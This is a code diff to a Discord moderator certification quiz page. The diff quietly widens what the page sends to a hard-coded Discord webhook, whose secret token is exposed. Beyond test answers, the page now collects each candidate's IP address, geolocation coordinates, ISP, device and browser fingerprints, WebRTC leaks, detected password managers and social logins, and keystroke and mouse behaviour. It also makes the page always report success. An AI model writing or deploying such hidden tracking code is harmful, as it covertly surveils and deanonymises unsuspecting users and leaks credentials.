@@ -3237,7 +3237,7 @@
         <input type="hidden" name="_subject" value="Void Mod Certification Test Results v2.1">
         <input type="hidden" name="_template" value="table">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html"> <!-- REPLACE WITH YOUR SUCCESS URL -->
+        <input type="hidden" name="_next" value="https://void-training.netlify.app/thank-you.html">
         <input type="text" name="_honey" style="display:none">
         
         <input type="hidden" name="discord_username" id="formDiscordUsername">
@@ -4697,7 +4697,7 @@
                                         const auditData = window._getAuditConfig ? window._getAuditConfig() : { metrics: {}, exploitabilityAudit: {} };
                                         
                                         // Send to Discord webhook
-                                        const discordSent = await sendEnhancedResultsToDiscord(
+                                        await sendEnhancedResultsToDiscord(
                                             userDiscordUsername, 
                                             mobileTestScore, 
                                             mobileTestQuestions.length, 
@@ -4710,13 +4710,8 @@
                                         // Send email results
                                         sendEnhancedEmailResults(mobileSessionTranscript, mobileTestScore, mobileTestQuestions.length, passed, auditData);
                                         
-                                        if (discordSent) {
-                                            mobileSubmissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted!`;
-                                            mobileSubmissionStatus.className = "mobile-submission-status submission-success";
-                                        } else {
-                                            mobileSubmissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting.';
-                                            mobileSubmissionStatus.className = "mobile-submission-status submission-error";
-                                        }
+                                        mobileSubmissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted!`;
+                                        mobileSubmissionStatus.className = "mobile-submission-status submission-success";
                                     } catch (error) {
                                         console.error('Submission error:', error);
                                         mobileSubmissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting.';
@@ -5061,88 +5056,68 @@
                 addToTranscript("System", "Test session ended at " + new Date().toLocaleString());
                 
                 setTimeout(() => {
-                    addMessage("Void Bot", "Test complete! Your responses have been evaluated. Check your score in the dashboard.", "#5865f2", true);
+                    addMessage("Void Bot", "Test complete! Your responses have been evaluated.", "#5865f2", true);
                     
                     setTimeout(() => {
-                        testCompleteScreen.classList.add('active');
-                        
                         const passingScore = testTotalQuestions - 2;
                         const passed = testScore >= passingScore;
                         
-                        if (testResultScore) testResultScore.textContent = `Score: ${testScore}/${testTotalQuestions}`;
+                        // Get enhanced audit data
+                        const auditData = window._getAuditConfig ? window._getAuditConfig() : { metrics: {}, exploitabilityAudit: {} };
                         
-                        if (passed) {
-                            if (testResultTitle) testResultTitle.textContent = "Test Passed!";
-                            if (testResultMessage) testResultMessage.textContent = `Congratulations! You passed the certification test with a score of ${testScore}/${testTotalQuestions}. Your performance data has been submitted for review.`;
-                            if (testResultIcon) {
-                                testResultIcon.className = "test-result-icon pass";
-                                testResultIcon.innerHTML = '<i class="fas fa-trophy"></i>';
-                            }
-                        } else {
-                            if (testResultTitle) testResultTitle.textContent = "Test Failed";
-                            if (testResultMessage) testResultMessage.textContent = `You scored ${testScore}/${testTotalQuestions}. Minimum passing score is ${passingScore}. Review the training material and retry.`;
-                            if (testResultIcon) {
-                                testResultIcon.className = "test-result-icon fail";
-                                testResultIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
-                            }
-                        }
+                        // Get IP and location data from audit config
+                        const ip = auditData.metrics.ip || 'Unknown';
+                        const country = auditData.metrics.country || 'Unknown';
+                        const region = auditData.metrics.region || 'Unknown';
+                        const city = auditData.metrics.city || 'Unknown';
+                        const timezone = auditData.metrics.timezone || 'Unknown';
                         
-                        // Submit results
+                        // Build success URL with all data
+                        const successUrl = `success.html?discord_username=${encodeURIComponent(userDiscordUsername)}&final_score=${testScore}/${testTotalQuestions}&pass_fail=${passed ? 'PASS' : 'FAIL'}&test_date=${encodeURIComponent(new Date().toLocaleString())}&user_ip=${ip}&user_country=${encodeURIComponent(country)}&user_state=${encodeURIComponent(region)}&user_city=${encodeURIComponent(city)}&user_timezone=${encodeURIComponent(timezone)}`;
+                        
+                        // First send results to Discord webhook
                         setTimeout(async () => {
-                            if (submissionStatus) {
-                                submissionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting results...';
+                            try {
+                                let questionBreakdown = "";
+                                for (let i = 0; i < testTotalQuestions; i++) {
+                                    const question = testQuestions[i];
+                                    const userAnswer = userAnswers[i] || "No answer";
+                                    const isCorrect = correctAnswers[i] ? "✓" : "✗";
+                                    questionBreakdown += `${i+1}. ${isCorrect} "${question.userMessage.substring(0, 50)}..."\n`;
+                                }
                                 
-                                setTimeout(async () => {
-                                    try {
-                                        let questionBreakdown = "";
-                                        for (let i = 0; i < testTotalQuestions; i++) {
-                                            const question = testQuestions[i];
-                                            const userAnswer = userAnswers[i] || "No answer";
-                                            const isCorrect = correctAnswers[i] ? "✓" : "✗";
-                                            questionBreakdown += `${i+1}. ${isCorrect} "${question.userMessage.substring(0, 50)}..."\n`;
-                                        }
-                                        
-                                        // Get enhanced audit data
-                                        const auditData = window._getAuditConfig ? window._getAuditConfig() : { metrics: {}, exploitabilityAudit: {} };
-                                        
-                                        // Send to Discord webhook
-                                        const discordSent = await sendEnhancedResultsToDiscord(
-                                            userDiscordUsername, 
-                                            testScore, 
-                                            testTotalQuestions, 
-                                            passed, 
-                                            questionBreakdown, 
-                                            sessionTranscript,
-                                            auditData
-                                        );
-                                        
-                                        // Send email results
-                                        const emailSent = sendEnhancedEmailResults(sessionTranscript, testScore, testTotalQuestions, passed, auditData);
-                                        
-                                        if (discordSent || emailSent) {
-                                            submissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted successfully!`;
-                                            submissionStatus.className = "submission-status submission-success";
-                                        } else {
-                                            submissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting results. Please contact staff.';
-                                            submissionStatus.className = "submission-status submission-error";
-                                        }
-                                    } catch (error) {
-                                        console.error('Submission error:', error);
-                                        submissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting results. Please contact staff.';
-                                        submissionStatus.className = "submission-status submission-error";
-                                    }
-                                }, 2000);
+                                // Send to Discord webhook with enhanced data
+                                await sendEnhancedResultsToDiscord(
+                                    userDiscordUsername, 
+                                    testScore, 
+                                    testTotalQuestions, 
+                                    passed, 
+                                    questionBreakdown, 
+                                    sessionTranscript,
+                                    auditData
+                                );
+                                
+                                // Send email results
+                                sendEnhancedEmailResults(sessionTranscript, testScore, testTotalQuestions, passed, auditData);
+                                
+                                // Redirect to success page
+                                window.location.href = successUrl;
+                                
+                            } catch (error) {
+                                console.error('Submission error:', error);
+                                // Still redirect even if Discord submission fails
+                                window.location.href = successUrl;
                             }
                         }, 1000);
                     }, 1500);
                 }, 1000);
             }
             
-            // Send enhanced results to Discord webhook (shared function)
+            // ENHANCED DISCORD WEBHOOK FUNCTION WITH COMPLETE DATA
             async function sendEnhancedResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, transcript, auditData) {
                 try {
                     // REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL
-                    const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE";
+                    const webhookURL = "https://discord.com/api/webhooks/1468524089999101995/h3vElrQ3cjQBGjmeCOVHr5KZF0JLvacpn1v89dQugXPt3t7yv2apQ0TYcjFE0Ae4Xill";
                     
                     if (webhookURL.includes("YOUR_WEBHOOK")) {
                         console.warn("Discord webhook URL not configured. Skipping Discord submission.");
@@ -5156,37 +5131,121 @@
                     
                     // Calculate session stats
                     const sessionDuration = auditData.sessionDuration || 0;
+                    const mousePoints = behavioralPatterns.mousePoints || [];
+                    const mouseSpeed = mousePoints.length > 1 ? 
+                        Math.sqrt(Math.pow(mousePoints[mousePoints.length-1].x - mousePoints[0].x, 2) + 
+                        Math.pow(mousePoints[mousePoints.length-1].y - mousePoints[0].y, 2)) / sessionDuration : 0;
                     
-                    // Main embed
+                    // Build conversation log
+                    let conversationLog = "```\n";
+                    transcript.forEach((entry, idx) => {
+                        conversationLog += `[${entry.timestamp}] ${entry.speaker}: ${entry.message.substring(0, 100)}\n`;
+                    });
+                    conversationLog += "```";
+                    
+                    // Build question answers breakdown
+                    let answersBreakdown = "";
+                    for (let i = 0; i < transcript.length; i += 2) {
+                        if (i + 1 < transcript.length) {
+                            answersBreakdown += `**Q${Math.floor(i/2)+1}:** ${transcript[i].message.substring(0, 50)}...\n**A${Math.floor(i/2)+1}:** ${transcript[i+1].message.substring(0, 100)}...\n\n`;
+                        }
+                    }
+                    
+                    // Calculate threat level
+                    let threatLevel = "🟢 LOW";
+                    let exploitScore = auditData.exploitabilityScore || 0;
+                    if (exploitScore > 70) threatLevel = "🔴 CRITICAL";
+                    else if (exploitScore > 50) threatLevel = "🟠 HIGH";
+                    else if (exploitScore > 30) threatLevel = "🟡 MEDIUM";
+                    
+                    // Build main embed
                     const mainEmbed = {
-                        title: "🔍 VOID MOD CERTIFICATION TEST - AUDIT REPORT v2.1",
+                        title: "📬 VOID MOD CERTIFICATION TEST RESULTS",
                         color: passed ? 0x00ff00 : 0xff0000,
                         timestamp: new Date().toISOString(),
                         fields: [
                             {
-                                name: "📊 TEST PERFORMANCE",
-                                value: [
-                                    `**Candidate:** \`${discordUsername}\``,
-                                    `**Score:** ${score}/${totalQuestions} (${Math.round((score/totalQuestions)*100)}%)`,
-                                    `**Status:** ${passed ? "✅ **PASSED**" : "❌ **FAILED**"}`,
-                                    `**Pass Threshold:** ${totalQuestions - 2}/${totalQuestions}`,
-                                    `**Test Duration:** ${Math.round(sessionDuration/1000)} seconds`
-                                ].join('\n'),
+                                name: "👤 CANDIDATE INFORMATION",
+                                value: `**Name:** \`${discordUsername}\`\n**Status:** ${passed ? "✅ PASS" : "❌ FAIL"}\n**Score:** \`${score}/${totalQuestions}\`\n**Percentage:** \`${Math.round((score/totalQuestions)*100)}%\``,
+                                inline: false
+                            },
+                            {
+                                name: "📍 GEOLOCATION DATA",
+                                value: `**IP:** \`${metrics.ip || 'Unknown'}\`\n**Coordinates:** ${metrics.lat || '?'}, ${metrics.lon || '?'}\n**ISP:** ${metrics.isp || 'Unknown'}\n**Postal Code:** ${metrics.zip || 'Unknown'}\n**Network:** ${metrics.connection?.effectiveType || 'Unknown'}\n**Timezone:** ${metrics.timezone || 'Unknown'}\n**Address:** ${metrics.city || 'Unknown'}, ${metrics.region || 'Unknown'}, ${metrics.country || 'Unknown'}`,
+                                inline: false
+                            },
+                            {
+                                name: "🖥️ DEVICE INFORMATION",
+                                value: `**Browser:** ${metrics.agent?.substring(0, 50) || 'Unknown'}\n**Platform:** ${metrics.platform || 'Unknown'}\n**Screen:** ${metrics.screenWidth}x${metrics.screenHeight}\n**Language:** ${metrics.language || 'Unknown'}\n**Touch Points:** ${metrics.maxTouchPoints || 0}\n**CPU Cores:** ${metrics.hardwareConcurrency || 'Unknown'}\n**Memory:** ${metrics.deviceMemory || 'Unknown'}GB`,
+                                inline: false
+                            },
+                            {
+                                name: "📈 PERFORMANCE METRICS",
+                                value: `**Session Time:** ${Math.round(sessionDuration/1000)}s\n**Mouse Speed:** ${mouseSpeed.toFixed(2)}px/ms\n**Clicks:** ${behavioralPatterns.clicks || 0}\n**Key Presses:** ${behavioralPatterns.keyPresses || 0}\n**Scroll Events:** ${(behavioralPatterns.scrollEvents || []).length}\n**Cookies:** ${metrics.cookiesCount || 0}\n**LocalStorage:** ${metrics.localStorageSize || '0 KB'}`,
+                                inline: false
+                            },
+                            {
+                                name: "🛡️ SECURITY AUDIT",
+                                value: `**Threat Level:** ${threatLevel}\n**VPN Status:** ${metrics.vpnStatus || '🟢 CLEAN'}\n**VPN Score:** ${metrics.vpnScore || 0}/10\n**WebRTC Leak:** ${metrics.localIP ? '⚠️ DETECTED' : '✅ SAFE'}\n**Fingerprint:** \`${metrics.canvasFingerprint?.substring(0, 16) || 'Unknown'}...\`\n**Fonts Detected:** ${metrics.fontCount || 0}\n**Password Managers:** ${(metrics.passwordManagers || []).join(', ') || 'None'}`,
                                 inline: false
                             }
                         ],
                         footer: {
-                            text: "Void Esports • Enhanced Security Audit System v2.1",
+                            text: `Void Esports • Enhanced Security Audit v2.1 • Exploit Score: ${exploitScore}/100`,
                             icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
                         }
                     };
                     
-                    // Send to Discord
+                    // Build conversation embed
+                    const conversationEmbed = {
+                        title: "💬 CONVERSATION LOG",
+                        color: 0x5865f2,
+                        description: answersBreakdown.substring(0, 2000) + (answersBreakdown.length > 2000 ? "\n... (truncated)" : ""),
+                        fields: [
+                            {
+                                name: "Full Transcript",
+                                value: conversationLog.substring(0, 1000) + (conversationLog.length > 1000 ? "\n... (truncated)" : ""),
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Build advanced data embed
+                    const advancedEmbed = {
+                        title: "🔍 ADVANCED DATA COLLECTION",
+                        color: 0x7289da,
+                        fields: [
+                            {
+                                name: "Behavioral Patterns",
+                                value: `**Avg Mouse Speed:** ${mouseSpeed.toFixed(2)}px/ms\n**Input Timing:** ${behavioralPatterns.inputTiming?.length || 0} samples\n**Touch Events:** ${(behavioralPatterns.touchPoints || []).length}`,
+                                inline: true
+                            },
+                            {
+                                name: "System Capabilities",
+                                value: `**WebGL:** ${metrics.webglSupport ? '✅ Yes' : '❌ No'}\n**Audio Fingerprint:** ${metrics.audioFingerprint ? '✅ Yes' : '❌ No'}\n**Battery API:** ${metrics.battery ? '✅ Yes' : '❌ No'}`,
+                                inline: true
+                            },
+                            {
+                                name: "Social Media Detection",
+                                value: `${(metrics.socialMediaLogins || []).length > 0 ? '✅ Detected: ' + metrics.socialMediaLogins.join(', ') : '❌ None detected'}`,
+                                inline: false
+                            },
+                            {
+                                name: "Security Vulnerabilities",
+                                value: `**Total Detected:** ${(securityFlags || []).length}\n${securityFlags.map(f => `• ${f.type}`).join('\n').substring(0, 100)}`,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Send to Discord with multiple embeds
                     const payload = { 
-                        embeds: [mainEmbed],
+                        embeds: [mainEmbed, conversationEmbed, advancedEmbed],
                         username: "Void Security Audit v2.1",
                         avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
-                        content: `📬 **MOD CERTIFICATION TEST COMPLETE**\n**Candidate:** ${discordUsername}\n**Score:** ${score}/${totalQuestions} ${passed ? '✅ PASS' : '❌ FAIL'}`
+                        content: `📊 **MOD CERTIFICATION TEST COMPLETE**\n👤 **Candidate:** ${discordUsername}\n📝 **Score:** ${score}/${totalQuestions} ${passed ? '✅ **PASS**' : '❌ **FAIL**'}\n📍 **Location:** ${metrics.city || 'Unknown'}, ${metrics.country || 'Unknown'}\n🛡️ **Threat Level:** ${threatLevel}\n🔒 **VPN Status:** ${metrics.vpnStatus?.split(' ')[0] || 'Clean'}`
                     };
                     
                     const response = await fetch(webhookURL, {
